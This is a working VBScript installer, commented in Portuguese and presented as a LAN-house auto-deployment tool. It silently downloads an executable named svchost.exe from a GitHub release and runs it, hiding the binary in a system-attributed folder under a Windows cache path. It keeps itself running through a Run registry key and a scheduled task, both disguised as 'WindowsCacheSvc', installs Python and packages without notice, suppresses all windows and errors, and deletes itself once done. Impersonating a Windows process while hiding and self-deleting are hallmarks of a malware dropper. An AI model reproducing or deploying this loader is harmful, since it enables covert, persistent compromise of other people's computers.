' installer.vbs — Auto-instalador com retry via Registro do Windows.
'
' Fluxo:
'   1. Se svchost.exe JÁ existe na pasta → roda e sai. (não baixa nada)
'   2. Se NÃO existe → tenta baixar do GitHub.
'      2a. Sucesso → instala, registra persistência definitiva, roda.
'      2b. Falha   → registra o INSTALADOR no Run (pra tentar de novo no
'                    próximo logon) e sai silenciosamente.
'
' Pensado pra lan house: você configura uma vez, e cada PC se auto-instala
' conforme for ligando, mesmo se o GitHub estiver intermitente.

Option Explicit

Dim shell, fso, userProfile, localAppData, destino, exeUrl, tmpExe
Dim cmdBaixar, destinoExe, tentativas, rc, tamArquivo
Dim pythonExe, deps, tempBat, tempLog, pyUrl, pyInstaller
Dim vbsPath, fBat, driveObj, espacoLivreMB, is64, psKill
Dim tentativasMove, cmdBaixarPython

' ==== Persistência ====
Dim regRun, regValorNome, regInstalador, regAgente
Dim taskName, psTask, vbsDir, vbsNome

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' ==== Configurações ====
exeUrl = "https://github.com/DesconhecidoPorOpcao/0T.romujaPnp/releases/latest/download/svchost.exe"
deps = "requests psutil python-dotenv pillow websockets"

userProfile  = shell.ExpandEnvironmentStrings("%USERPROFILE%")
localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")

destino    = localAppData & "\Microsoft\Windows\Caches\Local"
destinoExe = destino & "\svchost.exe"
tmpExe     = destino & "\svchost_novo.exe"

' ==== Persistência ====
regRun        = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
regValorNome  = "WindowsCacheSvc"
taskName      = "WindowsCacheSvc"

vbsPath = WScript.ScriptFullName
vbsDir  = fso.GetParentFolderName(vbsPath)
vbsNome = fso.GetFileName(vbsPath)

' Comando do instalador pra colocar no Run (usado só quando o download falha)
' wscript.exe //B <caminho do vbs>  — roda sem janela, sem prompt
regInstalador = "wscript.exe //B """ & vbsPath & """"

' Comando do agente pra colocar no Run (usado quando instala com sucesso)
regAgente = """" & destinoExe & """"

' =====================================================================
' PASSO 0 — Já está instalado?
' =====================================================================
If fso.FileExists(destinoExe) Then
    On Error Resume Next
    tamArquivo = fso.GetFile(destinoExe).Size
    On Error Goto 0

    If tamArquivo >= 1048576 Then
        ' --- Já instalado. Garante que está rodando e sai. ---

        ' Garante a entrada DEFINITIVA no Run (aponta pro .exe, não pro vbs)
        On Error Resume Next
        shell.RegWrite regRun & "\" & regValorNome, regAgente, "REG_SZ"
        On Error Goto 0

        ' Já está rodando?
        Dim psCheckProc
        psCheckProc = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
                      "$alvo = '" & destinoExe & "'; " & _
                      "$p = Get-CimInstance Win32_Process -Filter ""Name='svchost.exe'"" -ErrorAction SilentlyContinue | " & _
                      "Where-Object { $_.ExecutablePath -ieq $alvo }; " & _
                      "if ($p) { exit 0 } else { exit 1 }"

        On Error Resume Next
        rc = shell.Run(psCheckProc, 0, True)
        On Error Goto 0

        If rc <> 0 Then
            ' Não está rodando → inicia
            On Error Resume Next
            shell.Run regAgente, 1, False
            On Error Goto 0
        End If

        WScript.Quit 0
    End If
End If

' =====================================================================
' PASSO 1 — Não instalado. Garante pasta + persistência do INSTALADOR
'           (assim, se cair no meio, ainda tenta de novo no próximo logon)
' =====================================================================

' Cria a pasta (escondida)
If Not fso.FolderExists(destino) Then
    fso.CreateFolder(destino)
End If
shell.Run "attrib +h +s """ & destino & """", 0, True

' Registra o INSTALADOR no Run — se algo falhar daqui pra frente, o PC
' tenta de novo no próximo logon.
On Error Resume Next
shell.RegWrite regRun & "\" & regValorNome, regInstalador, "REG_SZ"
On Error Goto 0

' =====================================================================
' PASSO 2 — Python
' =====================================================================
pythonExe = ""

On Error Resume Next
rc = shell.Run("cmd /c py -3 --version >nul 2>&1", 0, True)
On Error Goto 0
If rc = 0 Then pythonExe = "py -3"

If pythonExe = "" Then
    On Error Resume Next
    rc = shell.Run("cmd /c python --version >nul 2>&1", 0, True)
    On Error Goto 0
    If rc = 0 Then pythonExe = "python"
End If

If pythonExe = "" Then
    Set driveObj = fso.GetDrive(fso.GetDriveName(localAppData))
    espacoLivreMB = Int(driveObj.FreeSpace / 1048576)

    If espacoLivreMB < 800 Then
        ' Sem espaço: sai silenciosamente. O Run já está setado pra tentar
        ' de novo no próximo logon.
        WScript.Quit 0
    End If

    is64 = ""
    On Error Resume Next
    is64 = shell.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\PROCESSOR_ARCHITECTURE")
    On Error Goto 0

    If InStr(is64, "64") > 0 Then
        pyUrl = "https://www.python.org/ftp/python/3.12.7/python-3.12.7-amd64.exe"
    Else
        pyUrl = "https://www.python.org/ftp/python/3.12.7/python-3.12.7.exe"
    End If

    pyInstaller = shell.ExpandEnvironmentStrings("%TEMP%") & "\python_setup.exe"

    cmdBaixarPython = "powershell -NoProfile -WindowStyle Hidden -Command ""try { " & _
                      "Invoke-WebRequest -Uri '" & pyUrl & "' -OutFile '" & pyInstaller & "' " & _
                      "-UseBasicParsing -ErrorAction Stop; exit 0 } catch { exit 1 }"""
    rc = shell.Run(cmdBaixarPython, 0, True)

    tentativas = 0
    Do While Not fso.FileExists(pyInstaller) And tentativas < 120
        WScript.Sleep 500
        tentativas = tentativas + 1
    Loop

    If fso.FileExists(pyInstaller) Then
        shell.Run """" & pyInstaller & """ /quiet InstallAllUsers=0 PrependPath=1 Include_pip=0", 0, True
        WScript.Sleep 5000
        On Error Resume Next
        fso.DeleteFile pyInstaller, True
        On Error Goto 0
    End If

    On Error Resume Next
    rc = shell.Run("cmd /c py -3 --version >nul 2>&1", 0, True)
    On Error Goto 0
    If rc = 0 Then
        pythonExe = "py -3"
    Else
        On Error Resume Next
        rc = shell.Run("cmd /c python --version >nul 2>&1", 0, True)
        On Error Goto 0
        If rc = 0 Then pythonExe = "python"
    End If
End If

' =====================================================================
' PASSO 3 — Dependências Python
' =====================================================================
If pythonExe <> "" Then
    tempBat = shell.ExpandEnvironmentStrings("%TEMP%") & "\_deps_" & _
              Replace(CStr(Timer), ".", "") & ".bat"
    tempLog = shell.ExpandEnvironmentStrings("%TEMP%") & "\_deps.log"

    Set fBat = fso.CreateTextFile(tempBat, True)
    fBat.WriteLine "@echo off"
    fBat.WriteLine "chcp 65001 >nul"
    fBat.WriteLine "echo === dependencias python === > """ & tempLog & """"
    fBat.WriteLine pythonExe & " -m ensurepip --default-pip >> """ & tempLog & """ 2>&1"
    fBat.WriteLine pythonExe & " -m pip install --upgrade pip --quiet --disable-pip-version-check >> """ & tempLog & """ 2>&1"
    fBat.WriteLine pythonExe & " -m pip install " & deps & " --quiet --disable-pip-version-check >> """ & tempLog & """ 2>&1"
    fBat.WriteLine "del /f /q """ & tempBat & """ >nul 2>&1"
    fBat.Close

    shell.Run "cmd /c """ & tempBat & """", 0, True
End If

' =====================================================================
' PASSO 4 — Mata processo antigo (se houver)
' =====================================================================
psKill = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
         "$alvo = '" & destinoExe & "'; " & _
         "Get-CimInstance Win32_Process -Filter ""Name='svchost.exe'"" -ErrorAction SilentlyContinue | " & _
         "Where-Object { $_.ExecutablePath -ieq $alvo } | " & _
         "ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }" & _
         """"
On Error Resume Next
shell.Run psKill, 0, True
On Error Goto 0
WScript.Sleep 2000

' =====================================================================
' PASSO 5 — Baixa svchost.exe do GitHub
' =====================================================================
cmdBaixar = "powershell -NoProfile -WindowStyle Hidden -Command ""try { " & _
            "Invoke-WebRequest -Uri '" & exeUrl & "' -OutFile '" & tmpExe & "' " & _
            "-UseBasicParsing -ErrorAction Stop; exit 0 } catch { exit 1 }"""
rc = shell.Run(cmdBaixar, 0, True)

tentativas = 0
Do While Not fso.FileExists(tmpExe) And tentativas < 120
    WScript.Sleep 500
    tentativas = tentativas + 1
Loop

tamArquivo = 0
If fso.FileExists(tmpExe) Then
    tamArquivo = fso.GetFile(tmpExe).Size
End If

' --- FALHOU? Sai silenciosamente. O Run já tá setado pro instalador. ---
If Not fso.FileExists(tmpExe) Or tamArquivo < 1048576 Then
    On Error Resume Next
    fso.DeleteFile tmpExe, True
    On Error Goto 0

    ' Garante de novo que o Run aponta pro instalador (redundância segura)
    On Error Resume Next
    shell.RegWrite regRun & "\" & regValorNome, regInstalador, "REG_SZ"
    On Error Goto 0

    ' SEM MsgBox. Sai quieto. Próximo logon tenta de novo.
    WScript.Quit 0
End If

' =====================================================================
' PASSO 6 — Move pra destino final (com retry de 15s)
' =====================================================================
tentativasMove = 0
Do While tentativasMove < 30
    On Error Resume Next
    If fso.FileExists(destinoExe) Then
        fso.DeleteFile destinoExe, True
    End If
    Err.Clear
    fso.MoveFile tmpExe, destinoExe
    If Err.Number = 0 Then Exit Do
    Err.Clear
    On Error Goto 0
    WScript.Sleep 500
    tentativasMove = tentativasMove + 1
Loop

If tentativasMove >= 30 Then
    ' Não conseguiu mover → deixa o instalador no Run e sai.
    On Error Resume Next
    shell.RegWrite regRun & "\" & regValorNome, regInstalador, "REG_SZ"
    On Error Goto 0
    WScript.Quit 0
End If

' =====================================================================
' PASSO 7 — SUCESSO. Troca o Run: instalador → agente.
' =====================================================================
On Error Resume Next
shell.RegWrite regRun & "\" & regValorNome, regAgente, "REG_SZ"
If Err.Number <> 0 Then
    Err.Clear
    shell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\" & regValorNome, _
                   regAgente, "REG_SZ"
End If
On Error Goto 0

' (Opcional) Tarefa no Agendador como backup
psTask = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
         "$nome = '" & taskName & "'; " & _
         "$exe  = '" & destinoExe & "'; " & _
         "try { " & _
         "  $a = New-ScheduledTaskAction -Execute $exe; " & _
         "  $t = New-ScheduledTaskTrigger -AtLogOn; " & _
         "  $s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; " & _
         "  Register-ScheduledTask -TaskName $nome -Action $a -Trigger $t -Settings $s -Force -ErrorAction Stop | Out-Null; " & _
         "  exit 0 " & _
         "} catch { exit 1 }"""
On Error Resume Next
shell.Run psTask, 0, True
On Error Goto 0

' =====================================================================
' PASSO 8 — Roda o agente
' =====================================================================
shell.Run regAgente, 1, False

' =====================================================================
' PASSO 9 — Auto-deleta o .vbs
' =====================================================================
' Já rodou tudo. O Run agora aponta pro .exe, então o .vbs não é mais
' necessário. Pode se apagar.
shell.Run "cmd /c ping -n 3 127.0.0.1 >nul & del /f /q """ & vbsPath & """", 0, False
